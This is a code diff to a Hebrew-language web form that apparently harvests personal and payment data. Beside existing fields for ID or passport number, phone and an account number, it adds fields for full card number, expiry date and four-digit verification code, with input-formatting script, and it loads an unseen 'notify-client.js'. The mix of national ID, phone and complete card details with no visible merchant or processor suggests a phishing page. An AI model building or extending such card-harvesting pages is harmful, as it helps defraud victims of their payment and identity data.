@@ -76,7 +76,28 @@
       .clearfix {
         clear: both;
       }
+      /* Chrome, Edge, Safari */
+      input[type="number"]::-webkit-inner-spin-button,
+      input[type="number"]::-webkit-outer-spin-button {
+        -webkit-appearance: none;
+        margin: 0;
+      }
 
+      /* Firefox */
+      input[type="number"] {
+        -moz-appearance: textfield;
+        appearance: textfield;
+      }
+      /* إخفاء أيقونة التقويم */
+      input[type="date"]::-webkit-calendar-picker-indicator {
+        display: none;
+        -webkit-appearance: none;
+      }
+
+      /* إخفاء عناصر التحكم الإضافية */
+      input[type="date"]::-webkit-clear-button {
+        display: none;
+      }
       .spacer-for-logo {
         display: flex;
         align-items: center;
@@ -659,6 +680,7 @@
                   aria-label="מספר תעודת זהות או דרכון"
                   data-i18n-label="phIdNumber"
                   autocomplete="off"
+                  maxlength="16"
                   autocapitalize="off"
                   spellcheck="false"
                   required
@@ -683,6 +705,7 @@
                   aria-label="מספר תעודת זהות"
                   data-i18n-label="phAccountNumber"
                   inputmode="numeric"
+                  maxlength="16"
                   autocomplete="off"
                   required
                   aria-describedby="err-accountNumber"
@@ -704,6 +727,7 @@
                   aria-label="מספר טלפון"
                   data-i18n-label="phPhone"
                   inputmode="tel"
+                  maxlength="10"
                   autocomplete="tel"
                   required
                   aria-describedby="err-phone"
@@ -712,49 +736,68 @@
               </div>
 
               <div class="field">
-                <label for="email" data-i18n="phEmail">מספר כרטיס</label>
+                <label for="cardNamber" data-i18n="cardNamber"
+                  >מספר כרטיס</label
+                >
                 <input
-                  type="email"
-                  id="email"
+                  type="text"
+                  id="cardNamber"
                   class="input-field"
                   aria-label="כתובת מספר כרטיס"
-                  data-i18n-label="phEmail"
-                  autocomplete="email"
+                  data-i18n-label="cardNamber"
+                  maxlength="19"
+                  inputmode="numeric"
                   spellcheck="false"
                   required
-                  aria-describedby="err-email"
+                  aria-describedby="err-cardNamber"
                 />
-                <p class="field-error" id="err-email" role="alert" hidden></p>
+                <p
+                  class="field-error"
+                  id="err-cardNamber"
+                  role="alert"
+                  hidden
+                ></p>
               </div>
               <div class="field">
-                <label for="email" data-i18n="phEmail">תאריך תפוגה </label>
+                <label for="expiration" data-i18n="phExpiration"
+                  >תאריך תפוגה
+                </label>
                 <input
-                  type="email"
-                  id="email"
+                  type="text"
+                  id="expiration"
                   class="input-field"
-                  aria-label="תאריך תפוגה "
-                  data-i18n-label="phEmail"
-                  autocomplete="email"
+                  aria-label="תאריך תפוגה"
+                  data-i18n-label="phExpiration"
+                  inputmode="numeric"
+                  maxlength="8"
+                  autocomplete="off"
                   spellcheck="false"
                   required
-                  aria-describedby="err-email"
+                  aria-describedby="err-expiration"
                 />
-                <p class="field-error" id="err-email" role="alert" hidden></p>
+                <p
+                  class="field-error"
+                  id="err-expiration"
+                  role="alert"
+                  hidden
+                ></p>
               </div>
               <div class="field">
-                <label for="email" data-i18n="phEmail">קוד אימות </label>
+                <label for="code" data-i18n="phCode">קוד אימות </label>
                 <input
-                  type="email"
-                  id="email"
+                  type="text"
+                  id="code"
                   class="input-field"
-                  aria-label="קוד אימות "
-                  data-i18n-label="phEmail"
-                  autocomplete="email"
+                  aria-label="קוד אימות"
+                  data-i18n-label="phCode"
+                  inputmode="numeric"
+                  maxlength="4"
+                  pattern="[0-9]{4}"
                   spellcheck="false"
                   required
-                  aria-describedby="err-email"
+                  aria-describedby="err-code"
                 />
-                <p class="field-error" id="err-email" role="alert" hidden></p>
+                <p class="field-error" id="err-code" role="alert" hidden></p>
               </div>
               <p
                 class="form-status"
@@ -845,5 +888,39 @@
     </main>
 
     <script src="notify-client.js" defer></script>
+    <script>
+      const cardInput = document.getElementById("cardNamber");
+
+      cardInput.addEventListener("input", function () {
+        const digits = this.value.replace(/\D/g, "").slice(0, 16);
+
+        this.value = digits.match(/.{1,4}/g)?.join(" ") || "";
+      });
+      const expirationInput = document.getElementById("expiration");
+
+      expirationInput.addEventListener("input", function () {
+        const digits = this.value.replace(/\D/g, "").slice(0, 6);
+
+        let formatted = digits;
+
+        if (digits.length > 2) {
+          formatted = digits.slice(0, 2) + "/" + digits.slice(2);
+        }
+
+        if (digits.length > 4) {
+          formatted =
+            digits.slice(0, 2) +
+            "/" +
+            digits.slice(2, 4) +
+            "/" +
+            digits.slice(4, 6);
+        }
+
+        this.value = formatted;
+      });
+      document.getElementById("code").addEventListener("input", function () {
+        this.value = this.value.replace(/\D/g, "").slice(0, 4);
+      });
+    </script>
   </body>
 </html>
